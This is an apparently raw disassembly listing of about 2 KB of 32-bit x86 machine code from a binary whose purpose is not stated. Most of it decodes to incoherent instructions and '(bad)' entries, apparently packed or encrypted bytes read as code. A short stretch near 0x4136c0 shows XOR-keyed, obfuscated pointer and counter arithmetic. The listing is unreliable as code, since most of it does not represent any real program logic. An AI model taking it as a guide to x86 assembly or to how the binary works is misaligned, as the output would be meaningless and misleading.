  4131ed:	sub    esp,DWORD PTR [edi]
  4131ef:	dec    ebx
  4131f0:	xchg   ebp,eax
  4131f1:	and    esi,eax
  4131f3:	sub    BYTE PTR ds:0xf97cd20a,ah
  4131f9:	and    al,0x93
  4131fb:	mov    ebp,0xb52b0730
  413200:	cmp    eax,0x5898f9f3
  413205:	scas   al,BYTE PTR es:[edi]
  413206:	xchg   ecx,eax
  413207:	xchg   DWORD PTR [ebx-0x2c136cf9],ecx
  41320d:	les    esp,FWORD PTR [edx-0x5438874d]
  413213:	leave  
  413214:	repnz test eax,0xecc2d904
  41321a:	dec    esi
  41321b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41321c:	daa    
  41321d:	dec    esp
  41321e:	das    
  41321f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413220:	cwde   
  413221:	std    
  413222:	sbb    eax,0xc7125e81
  413227:	ss das 
  413229:	icebp  
  41322a:	aaa    
  41322b:	mov    al,ds:0xc582d926
  413230:	in     eax,dx
  413231:	lods   al,BYTE PTR ds:[esi]
  413232:	xchg   esi,eax
  413233:	dec    esp
  413234:	ins    BYTE PTR es:[edi],dx
  413235:	std    
  413236:	jo     0x4132b3
  413238:	fmul   st(0),st
  41323a:	jmp    DWORD PTR [ebp+0x47]
  41323d:	jl     0x413272
  41323f:	out    dx,al
  413240:	push   esp
  413241:	out    dx,eax
  413242:	jno    0x4131db
  413244:	push   ss
  413245:	inc    ebx
  413246:	or     al,0x6d
  413248:	adc    al,0xf9
  41324a:	sbb    eax,0x62db7cc2
  41324f:	jae    0x413223
  413251:	lods   eax,DWORD PTR ds:[esi]
  413252:	push   esp
  413253:	mov    esi,ecx
  413255:	add    BYTE PTR [esi+0x7a],dh
  413258:	cmc    
  413259:	sub    edi,esp
  41325b:	fcom   QWORD PTR [edi]
  41325d:	pop    ds
  41325e:	test   edx,ebx
  413260:	pusha  
  413261:	inc    ecx
  413262:	mov    al,ds:0x87b1e0e1
  413267:	fadd   QWORD PTR [eax]
  413269:	popf   
  41326a:	out    dx,al
  41326b:	fdiv   DWORD PTR [edx-0x12]
  41326e:	fsubr  st(7),st
  413270:	in     eax,dx
  413271:	inc    esi
  413272:	aam    0xc1
  413274:	cmc    
  413275:	mov    edi,0x7f43bae9
  41327a:	and    edi,esi
  41327c:	push   eax
  41327d:	mov    ds:0xab5a41ea,eax
  413283:	push   cs
  413284:	sbb    DWORD PTR [ecx-0x52fdf7bc],0x747b22a4
  41328e:	sub    BYTE PTR [ecx-0xd4f6418],dh
  413294:	mov    cl,0x49
  413296:	lea    ecx,[ebx+eax*1+0x6abbb7b6]
  41329d:	xor    BYTE PTR [eax],cl
  41329f:	mov    esp,0x9cb4a4f2
  4132a4:	jno    0x413318
  4132a6:	mov    ebx,esi
  4132a8:	sub    cl,BYTE PTR [edi+0x2eca2dd1]
  4132ae:	mov    esp,0x7819e37f
  4132b3:	add    eax,0xa0a1449b
  4132b8:	cdq    
  4132b9:	das    
  4132ba:	or     BYTE PTR ds:0x80a0ff04,cl
  4132c0:	outs   dx,BYTE PTR ds:[esi]
  4132c1:	and    ch,BYTE PTR [edi-0x73]
  4132c4:	jmp    0x3c35:0x35a3951a
  4132cb:	mov    dh,bl
  4132cd:	push   ebx
  4132ce:	imul   esi,DWORD PTR [eax],0xffffffc3
  4132d1:	ds inc esi
  4132d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132d4:	jge    0x4132f6
  4132d6:	lds    eax,FWORD PTR [edx+0x6eed5da5]
  4132dc:	into   
  4132dd:	(bad)  
  4132de:	outs   dx,BYTE PTR ds:[esi]
  4132df:	inc    esi
  4132e0:	add    cl,BYTE PTR [esi+0x43f8d33f]
  4132e6:	add    eax,0x1da39b61
  4132eb:	adc    DWORD PTR [eax-0x1a],0x5e
  4132ef:	and    DWORD PTR [eax+0x31a77047],0x3a
  4132f6:	inc    eax
  4132f7:	jmp    0x5d88:0x9dd9de83
  4132fe:	loope  0x4132c6
  413300:	sbb    bl,ah
  413302:	jno    0x41331a
  413304:	and    BYTE PTR [edx],bl
  413306:	adc    ebx,DWORD PTR [ecx-0x28b84e5]
  41330c:	(bad)  
  41330d:	aaa    
  41330e:	sub    cl,BYTE PTR [eax-0x66]
  413311:	sar    DWORD PTR [edi+0x6c8f250d],cl
  413317:	enter  0x1938,0xf5
  41331b:	fwait
  41331c:	inc    edi
  41331d:	leave  
  41331e:	add    BYTE PTR [ecx],dl
  413320:	js     0x41337b
  413322:	call   0x6138:0x9045ba29
  413329:	mov    ecx,0x999311c2
  41332e:	adc    eax,0x682a40b3
  413333:	and    BYTE PTR [edi+0x1fb9e446],ch
  413339:	ficomp WORD PTR ss:[edx-0x59]
  41333d:	call   0x23008b9e
  413342:	xor    DWORD PTR [esi-0x2f],ebp
  413345:	mov    cl,0xb
  413347:	dec    esp
  413348:	call   0xd929:0x8d254e5
  41334f:	repnz and DWORD PTR [esi],ebx
  413352:	xor    bl,BYTE PTR [ebx+0x14]
  413355:	or     cl,BYTE PTR [ecx+edx*1]
  413358:	inc    edx
  413359:	pop    esp
  41335a:	mov    ecx,0x4761982
  41335f:	push   eax
  413360:	int3   
  413361:	mov    ecx,0xb5f41e0a
  413366:	mov    ds:0x107c692e,al
  41336b:	retf   
  41336c:	sahf   
  41336d:	aaa    
  41336e:	mov    esi,0x3f5f1fce
  413373:	stos   DWORD PTR es:[edi],eax
  413374:	jns    0x41336c
  413376:	pop    es
  413377:	pop    ebp
  413378:	nop
  413379:	xor    BYTE PTR [edi-0x34],bl
  41337c:	nop
  41337d:	(bad)  
  41337e:	mov    al,ds:0x3d4d2dce
  413383:	je     0x4133db
  413385:	xchg   esi,ecx
  413387:	popf   
  413388:	rcl    BYTE PTR [edi+0x6],1
  41338b:	aaa    
  41338c:	xchg   ebx,eax
  41338d:	(bad)  
  41338e:	pop    ss
  41338f:	mov    ch,0x50
  413391:	xor    eax,0x28fa21e7
  413396:	inc    ebp
  413397:	ret    
  413398:	pop    eax
  413399:	push   es
  41339a:	mov    cl,0xc7
  41339c:	popf   
  41339d:	inc    esp
  41339e:	scas   eax,DWORD PTR es:[edi]
  41339f:	jno    0x4133a3
  4133a1:	or     BYTE PTR [ebx+0x46],dl
  4133a4:	add    dh,BYTE PTR [edx]
  4133a6:	fldcw  WORD PTR [ecx-0x7e8002d4]
  4133ac:	jp     0x4133f2
  4133ae:	stos   BYTE PTR es:[edi],al
  4133af:	fistp  QWORD PTR [ebx-0x62]
  4133b2:	jne    0x4133e2
  4133b4:	jns    0x7467f94
  4133ba:	pop    ds
  4133bb:	(bad)  
  4133bc:	mov    ebp,0x1c2f9e6a
  4133c1:	(bad)  
  4133c2:	retf   
  4133c3:	ret    0xb277
  4133c6:	fisubr DWORD PTR [esi+esi*4+0x55]
  4133ca:	fnsave [edx+eax*4+0x21]
  4133ce:	sub    al,BYTE PTR [edi+eax*4]
  4133d1:	add    eax,0x5fa4bca5
  4133d6:	pop    ss
  4133d7:	jb     0x413444
  4133d9:	mov    edi,0x413b4d60
  4133de:	aaa    
  4133df:	jl     0x4133f9
  4133e1:	xchg   ecx,eax
  4133e2:	xor    ebp,DWORD PTR [edx-0x5]
  4133e5:	out    0x35,al
  4133e7:	ret    0x55a5
  4133ea:	nop
  4133eb:	arpl   bp,bx
  4133ed:	cwde   
  4133ee:	push   edx
  4133ef:	adc    DWORD PTR [edx+0x4f],0x7220cdfa
  4133f6:	cmp    bl,dh
  4133f8:	push   ebp
  4133f9:	add    eax,0xd30d9fd3
  4133fe:	cmp    edx,eax
  413400:	mov    ah,0x20
  413402:	sbb    BYTE PTR ds:0x90c4b4b6,cl
  413408:	mov    DWORD PTR [esp+ebp*2],ebx
  41340b:	outs   dx,DWORD PTR ds:[esi]
  41340c:	fwait
  41340d:	jno    0x41343f
  41340f:	add    eax,0x7e99a245
  413414:	mov    eax,ds:0x17424576
  413419:	lds    esp,FWORD PTR [ecx+esi*2]
  41341c:	jle    0x413441
  41341e:	into   
  41341f:	jg     0x4133a7
  413421:	loope  0x413407
  413423:	test   eax,esi
  413425:	add    eax,0x4367b487
  41342a:	cdq    
  41342b:	sbb    ebp,DWORD PTR [bp+di-0x1d]
  41342f:	push   0xffffffe9
  413431:	push   ebx
  413432:	dec    ebp
  413433:	fpatan 
  413435:	mov    ebx,0xdc695ad5
  41343a:	jecxz  0x413441
  41343c:	inc    edi
  41343d:	daa    
  41343e:	(bad)  
  413441:	xchg   edx,eax
  413442:	(bad)  
  413445:	mov    ds:0xbd1ab6e8,eax
  41344a:	fnsave [eax+0x63940830]
  413450:	push   ebp
  413451:	add    BYTE PTR [ecx-0x451a5c94],ch
  413457:	cld    
  413458:	das    
  413459:	cdq    
  41345a:	push   ecx
  41345b:	mov    cl,0x5
  41345d:	cwde   
  41345e:	jp     0x413497
  413460:	sub    al,0xd3
  413462:	bound  eax,QWORD PTR [esi-0x46]
  413465:	dec    ebx
  413466:	sub    DWORD PTR [eax],edx
  413468:	fwait
  413469:	mov    esi,DWORD PTR [edx+ebp*2+0x1e]
  41346d:	aad    0x91
  41346f:	dec    edx
  413470:	lock mov ebx,0x6cfaf095
  413476:	repnz sub al,0x97
  413479:	sub    DWORD PTR [esi+esi*8],ebp
  41347c:	xchg   ebx,eax
  41347d:	(bad)  
  41347e:	or     edi,edx
  413480:	stc    
  413481:	dec    ebp
  413482:	sbb    BYTE PTR [edi],ch
  413484:	lahf   
  413485:	jge    0x413484
  413487:	cmp    al,0x1d
  413489:	mov    dl,0xfe
  41348b:	cmp    ch,bl
  41348d:	or     esp,edx
  41348f:	pop    ds
  413490:	sar    BYTE PTR [ebp-0x77406ca2],0x96
  413497:	jmp    0x4f79a7c1
  41349c:	int    0x7f
  41349e:	xor    eax,0x965154ad
  4134a3:	push   esp
  4134a4:	xor    bh,BYTE PTR [esi-0x3369fddb]
  4134aa:	jg     0x4134ea
  4134ac:	cld    
  4134ad:	mov    ah,0x3a
  4134af:	inc    ecx
  4134b0:	and    DWORD PTR [ebx+edi*4],ebp
  4134b3:	ja     0x4134ba
  4134b5:	imul   eax,DWORD PTR [edx],0x1f
  4134b8:	rcl    BYTE PTR [esp+edx*8],cl
  4134bb:	rcl    BYTE PTR [ebx+0x673ca1b5],cl
  4134c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134c2:	push   cs
  4134c3:	or     ebp,DWORD PTR [ecx]
  4134c5:	int    0x2
  4134c7:	cdq    
  4134c8:	cmp    ecx,0x8b162b7c
  4134ce:	push   si
  4134d0:	(bad)  
  4134d1:	jbe    0x41352d
  4134d3:	mov    ds:0x9b6f0ac,al
  4134d8:	fiadd  WORD PTR [edi+0x1a3af5cb]
  4134de:	xor    bh,BYTE PTR [ebp-0x6922cf1b]
  4134e4:	int    0x99
  4134e6:	and    ebx,eax
  4134e8:	or     al,0xd4
  4134ea:	mov    BYTE PTR [ebx],bl
  4134ec:	cmc    
  4134ed:	dec    ebx
  4134ee:	xchg   esi,eax
  4134ef:	sub    ebp,edi
  4134f1:	push   eax
  4134f2:	bound  edx,QWORD PTR [ebx-0x107f218a]
  4134f8:	mov    bl,BYTE PTR [edx-0x32462ed9]
  4134fe:	sar    DWORD PTR [esi+0x41],0xe5
  413502:	stos   BYTE PTR es:[di],al
  413504:	fiadd  DWORD PTR ss:[esi+0x1c]
  413508:	call   0x579f:0x16b87229
  41350f:	das    
  413510:	push   eax
  413511:	and    eax,0xc5eb0a6c
  413516:	push   esp
  413517:	in     eax,dx
  413518:	retf   0x3daf
  41351b:	fidiv  DWORD PTR [ecx+edx*8-0x26]
  41351f:	jp     0x413517
  413521:	rcl    DWORD PTR [edx+0xe],cl
  413524:	clc    
  413525:	popf   
  413526:	or     eax,0x64682d63
  41352b:	adc    eax,0x48b6b2de
  413530:	or     al,0x92
  413532:	mov    dh,0x4e
  413534:	imul   edx,DWORD PTR [ebp+edi*1+0x2f],0x46
  413539:	sub    ebx,esp
  41353b:	mov    bl,0xea
  41353d:	cmp    dl,BYTE PTR [edi+esi*4-0x25]
  413541:	dec    edi
  413542:	push   edx
  413543:	jmp    0xbc7ead6b
  413548:	jl     0x413556
  41354a:	(bad)  
  41354b:	inc    ebx
  41354c:	mov    ds:0xc67ff3e5,eax
  413551:	inc    ebx
  413552:	sbb    ecx,DWORD PTR [ebx+0xeba9c4e]
  413558:	xchg   ecx,eax
  413559:	popf   
  41355a:	mov    edi,0xad47264b
  41355f:	jne    0x41352a
  413561:	(bad)  
  413562:	test   DWORD PTR [ebx-0x71f5d78],ebp
  413568:	pop    ebp
  413569:	dec    esp
  41356a:	test   eax,0x15ca391f
  41356f:	mov    bl,0x96
  413571:	leave  
  413572:	mov    edx,ss
  413574:	fs pop ebx
  413576:	cdq    
  413577:	ret    
  413578:	and    esp,DWORD PTR [edi+ebx*2+0x32]
  41357c:	fsub   QWORD PTR [ebp+0xc]
  41357f:	aam    0x17
  413581:	outs   dx,BYTE PTR ds:[esi]
  413582:	jns    0x4135b6
  413584:	jmp    0xabd8:0xb1ce6ad1
  41358b:	pop    edx
  41358c:	rcl    DWORD PTR [ebp+0x1c7a463c],0x7e
  413593:	sti    
  413594:	mov    bl,0xb3
  413596:	call   0xc43cc11a
  41359b:	sub    bl,BYTE PTR cs:[edx-0x22]
  41359f:	xchg   BYTE PTR [ebp*4+0x364b5d72],dl
  4135a6:	xor    DWORD PTR ds:0xec5e6103,esp
  4135ac:	xor    bl,BYTE PTR [eax+0x29dcfa29]
  4135b2:	push   ecx
  4135b3:	fistp  QWORD PTR [eax+0x4a19afda]
  4135b9:	push   cs
  4135ba:	push   ebp
  4135bb:	push   edx
  4135bc:	mov    eax,ds:0x8cf4b0a1
  4135c1:	jno    0x4135a7
  4135c3:	bound  esp,QWORD PTR cs:[ecx]
  4135c6:	stos   DWORD PTR es:[edi],eax
  4135c7:	pop    edx
  4135c8:	stc    
  4135c9:	jno    0x413628
  4135cb:	and    eax,0x36294cdb
  4135d0:	jno    0x413607
  4135d2:	inc    esi
  4135d3:	cmc    
  4135d4:	xchg   edx,eax
  4135d5:	sahf   
  4135d6:	jne    0x41362d
  4135d8:	lods   al,BYTE PTR ds:[esi]
  4135d9:	jns    0x4135df
  4135db:	or     DWORD PTR [edi-0x7f45348],esp
  4135e1:	les    esi,FWORD PTR [eax]
  4135e3:	test   eax,0xa3c37863
  4135e8:	mov    eax,DWORD PTR [ebx-0x4d784be9]
  4135ee:	test   DWORD PTR [ecx+0x755921df],0x355db36e
  4135f8:	push   es
  4135f9:	ret    
  4135fa:	xchg   ecx,eax
  4135fb:	shr    BYTE PTR [edx],1
  4135fd:	ror    BYTE PTR [ecx+edi*4-0x75186f4f],cl
  413604:	dec    edx
  413605:	dec    ebx
  413606:	add    dl,ch
  413608:	xor    bh,BYTE PTR [eax+0x1b67c05a]
  41360e:	sar    BYTE PTR [ecx-0x5c686220],1
  413614:	hlt    
  413615:	mov    eax,0x8e16cdf8
  41361a:	imul   esi,DWORD PTR [edi+0x53],0xffffffe6
  41361e:	ja     0x41364f
  413620:	adc    BYTE PTR [esi-0x36],0xc9
  413624:	mov    WORD PTR [ecx-0x55],es
  413627:	push   ss
  413628:	or     al,0xa3
  41362a:	dec    esp
  41362b:	fisubr DWORD PTR [ebp-0x77]
  41362e:	retw   0xd2bb
  413632:	stc    
  413633:	mov    dh,cl
  413635:	pop    ebx
  413636:	sar    BYTE PTR [edx-0x2d],0x19
  41363a:	dec    edx
  41363b:	and    eax,DWORD PTR [esi]
  41363d:	mov    ds:0x932aca43,eax
  413642:	dec    ebp
  413643:	out    dx,al
  413644:	lods   eax,DWORD PTR ds:[esi]
  413645:	jle    0x4135f3
  413647:	dec    edx
  413648:	out    0xfd,al
  41364a:	inc    edi
  41364b:	mov    dl,0xe2
  41364d:	jmp    0x2045507b
  413652:	arpl   WORD PTR [esi-0x2e5b6c5c],ax
  413658:	mov    ds:0xa2d50c87,eax
  41365d:	xchg   ebx,eax
  41365e:	mov    edi,ebx
  413660:	and    dh,bl
  413662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413663:	mov    bh,BYTE PTR [esi-0xe]
  413666:	das    
  413667:	jnp    0x413650
  413669:	repnz adc esi,ebp
  41366c:	push   0xffffffd4
  41366e:	mov    esp,0xd24b27a5
  413673:	adc    al,0x68
  413675:	pop    es
  413676:	not    DWORD PTR [ecx-0x21]
  413679:	or     DWORD PTR [ebp+0x5d83d842],0xcf63c94d
  413683:	sub    eax,0x72a2bc3b
  413688:	add    BYTE PTR [edi+edx*1],al
  41368b:	in     eax,0x97
  41368d:	fcom   QWORD PTR [ecx+0x4f]
  413690:	fisubr DWORD PTR gs:[esi-0x38]
  413694:	sbb    ebp,0x6d
  413697:	fidiv  DWORD PTR [esi+0x16cf67b7]
  41369d:	cwde   
  41369e:	loop   0x4136f3
  4136a0:	jo     0x413675
  4136a2:	fadd   st,st(1)
  4136a4:	or     dl,cl
  4136a6:	add    edx,esp
  4136a8:	dec    esp
  4136a9:	pop    ebx
  4136aa:	jne    0x41370c
  4136ac:	mov    bh,0xff
  4136ae:	mov    ebp,0xc3480335
  4136b3:	xchg   DWORD PTR [ecx],eax
  4136b5:	inc    esi
  4136b6:	push   ss
  4136b7:	inc    esi
  4136b8:	jle    0x4136d3
  4136ba:	addr16 push ss
  4136bc:	pop    edi
  4136bd:	sub    DWORD PTR fs:[eax],esp
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0x42
  413798:	jo     0x4137af
  41379a:	shl    DWORD PTR [edx-0x329d9d95],1
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx+0x3f]
  4137a4:	mov    ds:0xd3def4bb,al
  4137a9:	push   edi
  4137aa:	or     al,0xfd
  4137ac:	jmp    0xf256455a
  4137b1:	push   ds
  4137b2:	dec    BYTE PTR [ebx-0x51]
  4137b5:	push   ss
  4137b6:	inc    ebx
  4137b7:	or     dl,BYTE PTR [edi+0x3d93e244]
  4137bd:	sbb    DWORD PTR [esi-0x49eadcd],edi
  4137c3:	lods   eax,DWORD PTR ds:[esi]
  4137c4:	data16 ffree st(6)
  4137c8:	inc    ebp
  4137c9:	ja     0x4137f4
  4137cb:	into   
  4137cc:	test   ecx,ebx
  4137ce:	xor    ecx,DWORD PTR [ebx]
  4137d0:	and    bl,bl
  4137d2:	jl     0x413851
  4137d4:	test   DWORD PTR [esi-0x4],eax
  4137d7:	popw   ss
  4137d9:	aas    
  4137da:	pop    esp
  4137db:	push   esi
  4137dc:	mov    edx,0xd210cabf
  4137e1:	je     0x4137cb
  4137e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137e4:	dec    ebp
  4137e5:	inc    esp
  4137e6:	add    bh,ch
  4137e8:	and    BYTE PTR [edx-0x1221f1a8],al
  4137ee:	sub    cl,cl
  4137f0:	or     eax,0x9fa1a4c8
  4137f5:	ret    0xea87
  4137f8:	iret   
  4137f9:	adc    DWORD PTR [edi-0x540ba44b],0x42
  413800:	stc    
  413801:	dec    esp
  413802:	in     eax,dx
  413803:	pcmpeqb mm7,mm4
  413806:	aas    
  413807:	scas   eax,DWORD PTR es:[edi]
  413808:	sti    
  413809:	push   ebp
  41380a:	test   eax,0x430f34f5
  41380f:	push   0x3f8aa504
  413814:	xchg   ebx,edx
  413816:	adc    ah,bh
  413818:	dec    edi
  413819:	pop    ebp
  41381a:	xor    al,0xb1
  41381c:	scas   eax,DWORD PTR es:[edi]
  41381d:	retf   
  41381e:	xlat   BYTE PTR ds:[ebx]
  41381f:	and    edx,eax
  413821:	ds out dx,eax
  413823:	lock cmp al,0x4e
  413826:	and    DWORD PTR [esi],ebx
  413828:	inc    ebp
  413829:	mov    cl,0x9b
  41382b:	cmp    edi,esp
  41382d:	outs   dx,DWORD PTR ds:[esi]
  41382e:	inc    ebx
  41382f:	sub    ah,BYTE PTR [esi-0x46f820f0]
  413835:	and    al,0x7f
  413837:	popf   
  413838:	adc    eax,0xc6d1b411
  41383d:	fstp   QWORD PTR [ebx-0x3231ccd0]
  413843:	test   al,0x37
  413845:	dec    ebx
  413846:	pop    es
  413847:	lea    ebp,[edx+eax*2+0x6db32239]
  41384e:	xchg   ebp,eax
  41384f:	jp     0x4137d7
  413851:	push   eax
  413852:	in     eax,dx
  413853:	(bad)  
  413854:	shr    BYTE PTR [ecx+0x73],cl
  413857:	test   bl,al
  413859:	xor    DWORD PTR [edx],eax
  41385b:	scas   al,BYTE PTR es:[edi]
  41385c:	scas   al,BYTE PTR es:[edi]
  41385d:	and    al,0xa0
  41385f:	inc    esp
  413860:	test   BYTE PTR [eax-0x70],0x56
  413864:	inc    edx
  413865:	ret    
  413866:	pop    edi
  413867:	xchg   esp,eax
  413868:	fst    DWORD PTR [esi-0x54]
  41386b:	(bad)  
  41386c:	pop    edi
  41386d:	inc    esi
  41386e:	test   esi,esi
  413870:	repnz xchg ebx,eax
  413872:	and    ch,dl
  413874:	stos   BYTE PTR es:[edi],al
  413875:	mov    esp,0x44d62048
  41387a:	repz push 0x14
  41387d:	add    bh,dl
  41387f:	ret    
  413880:	outs   dx,DWORD PTR ds:[esi]
  413881:	int3   
  413882:	sbb    ebx,DWORD PTR [esi]
  413884:	int3   
  413885:	or     ah,BYTE PTR [ebx]
  413887:	jne    0x413890
  413889:	or     al,0x38
  41388b:	inc    eax
  41388c:	jne    0x413896
  41388e:	(bad)  
  41388f:	in     eax,0x85
  413891:	dec    ebx
  413892:	dec    ecx
  413893:	jecxz  0x413899
  413895:	pop    es
  413896:	jl     0x413896
  413898:	xchg   esp,eax
  413899:	outs   dx,DWORD PTR ds:[esi]
  41389a:	and    edx,0x4
  41389d:	stos   DWORD PTR es:[edi],eax
  41389e:	int3   
  41389f:	clc    
  4138a0:	aam    0x1d
  4138a2:	mov    ecx,0x500c2c83
  4138a7:	pop    es
  4138a8:	dec    eax
  4138a9:	int    0xa3
  4138ab:	addr16 push 0x1a
  4138ae:	fisub  DWORD PTR [edi]
  4138b0:	imul   edi,esi,0xffffffe4
  4138b3:	aad    0x61
  4138b5:	push   0xffffffaa
  4138b7:	inc    eax
  4138b8:	mov    bl,0x18
  4138ba:	call   DWORD PTR [edi-0x45]
  4138bd:	hlt    
  4138be:	inc    edi
  4138bf:	enter  0x2706,0x39
  4138c3:	or     ebx,DWORD PTR [ebp+esi*2+0x4bdb5893]
  4138ca:	jb     0x413949
  4138cc:	jbe    0x413854
  4138ce:	mov    ebx,0x5b570296
  4138d3:	ins    DWORD PTR es:[edi],dx
  4138d4:	mov    ecx,0xc5adcd43
  4138d9:	xchg   edi,eax
  4138da:	aam    0x7d
  4138dc:	jecxz  0x413930
  4138de:	lea    esp,[esi-0x5c]
  4138e1:	(bad)  [ebx+0x11]
  4138e4:	lods   al,BYTE PTR ds:[esi]
  4138e5:	enter  0x417,0xcd
  4138e9:	lock jns 0x4138a5
  4138ec:	mov    ds:0xfaf064a,eax
  4138f1:	mov    eax,0x9e10970b
  4138f6:	cmc    
  4138f7:	mov    dh,0xa8
  4138f9:	(bad)  
  4138fa:	mov    ecx,0xd8c75f2e
  4138ff:	mov    ds:0xee4c3dad,eax
  413904:	push   eax
  413905:	xor    BYTE PTR [eax],ch
  413907:	js     0x41394f
  413909:	push   0x7e618adc
  41390e:	inc    esi
  41390f:	sti    
  413910:	scas   al,BYTE PTR es:[edi]
  413911:	in     al,dx
  413912:	xor    ch,BYTE PTR [ebx+eax*1]
  413915:	jae    0x4138bc
  413917:	xchg   ecx,eax
  413918:	cdq    
  413919:	test   ecx,ecx
  41391b:	pop    es
  41391c:	daa    
  41391d:	popa   
  41391e:	ins    BYTE PTR es:[edi],dx
  41391f:	ret    
  413920:	lea    ebp,[esi+0x6a]
  413923:	stos   BYTE PTR es:[edi],al
  413924:	shl    DWORD PTR [eax+0x3761e134],1
  41392a:	jg     0x413996
  41392c:	cdq    
  41392d:	out    dx,al
  41392e:	loope  0x413991
  413930:	rcl    DWORD PTR [ecx+0x78a336ca],1
  413936:	jns    0x41393e
  413938:	xchg   esp,eax
  413939:	xchg   esp,eax
  41393a:	repz cld 
  41393c:	jb     0x41397c
  41393e:	jae    0x41399b
  413940:	icebp  
  413941:	adc    eax,0xd560d89
  413946:	enter  0xeee7,0x97
  41394a:	dec    ebp
  41394b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41394c:	sti    
  41394d:	repnz or BYTE PTR [ecx-0x5413666e],cl
  413954:	mov    WORD PTR ds:0xf1f2e2c2,ss
  41395a:	xchg   BYTE PTR [ebx+0x376b7c8],ah
  413960:	sbb    bh,BYTE PTR [ecx-0x5b]
  413963:	(bad)  
  413964:	xchg   esp,eax
  413965:	lock in eax,dx
  413967:	jns    0x413911
  413969:	scas   al,BYTE PTR es:[edi]
  41396a:	ret    0xbe17
  41396d:	sbb    dl,0x46
  413970:	cmp    dh,BYTE PTR [ebx+0x22d3d53a]
  413976:	xor    esi,DWORD PTR [eax+0x70b59b08]
  41397c:	lods   eax,DWORD PTR ds:[esi]
  41397d:	jmp    0xbaa7:0xe1392bca
  413984:	mov    ss,WORD PTR [esi-0x2a9e306c]
  41398a:	ficomp WORD PTR [ebx]
  41398c:	add    ebx,DWORD PTR [eax+ebx*1]
  41398f:	and    edx,edx
  413991:	cmp    eax,DWORD PTR [ecx]
  413993:	sub    eax,0xf1a6b9cc
  413998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413999:	pusha  
  41399a:	xchg   ebx,eax
  41399b:	xor    BYTE PTR [eax-0x6e0970fb],0x7f
  4139a2:	aam    0x29
  4139a4:	pop    esp
  4139a5:	call   0xc40c:0x7996e09d
  4139ac:	adc    al,0x74
  4139ae:	ins    BYTE PTR es:[edi],dx
  4139af:	pop    es
  4139b0:	and    ah,BYTE PTR ds:0x43db592d
  4139b6:	dec    esi
  4139b7:	popf   
  4139b8:	stos   DWORD PTR es:[edi],eax
  4139b9:	mov    ah,BYTE PTR [eax]
  4139bb:	popf   
  4139bc:	pcmpeqb mm1,QWORD PTR [ebp+0x50]
  4139c0:	cld    
  4139c1:	jmp    0x413a08
  4139c3:	fdivr  st,st(7)
  4139c5:	fst    QWORD PTR [edx]
  4139c7:	mov    cl,0x23
  4139c9:	enter  0x8a56,0xaa
  4139cd:	push   edx
  4139ce:	inc    ebp
  4139cf:	inc    ebx
  4139d0:	fs jne 0x41399a
  4139d3:	stos   DWORD PTR es:[edi],eax
  4139d4:	(bad)  
  4139d5:	push   ss
  4139d6:	xor    DWORD PTR [ebx+edi*4+0x1abd7],ecx
  4139dd:	test   al,0xff
  4139df:	fwait
  4139e0:	sbb    al,0x9a
  4139e2:	jl     0x413a44
  4139e4:	jae    0x413a60
  4139e6:	mov    esp,0x22f61067
  4139eb:	fcom   QWORD PTR [edi]
  4139ed:	je     0x4139de
  4139ef:	xlat   BYTE PTR ds:[ebx]
